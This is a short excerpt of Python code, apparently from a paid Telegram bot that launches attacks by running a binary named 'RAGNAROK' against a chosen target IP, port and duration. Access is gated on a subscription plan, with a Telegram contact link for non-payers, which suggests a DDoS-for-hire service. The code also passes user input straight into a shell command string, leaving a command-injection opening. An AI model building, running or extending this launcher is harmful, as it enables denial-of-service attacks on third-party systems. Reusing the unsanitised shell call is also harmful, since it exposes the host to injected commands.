...
async def run_attack(target_ip, target_port, duration):
    ...
    try:
        process = await asyncio.create_subprocess_shell(f"./RAGNAROK {target_ip} {target_port} {duration} 900")
...
def handle_attack(message):
    ...
    if not user_data or user_data.get('plan', 0) == 0:
        bot.reply_to(message, "https://t.me/@PRINCE_OP5")
        return
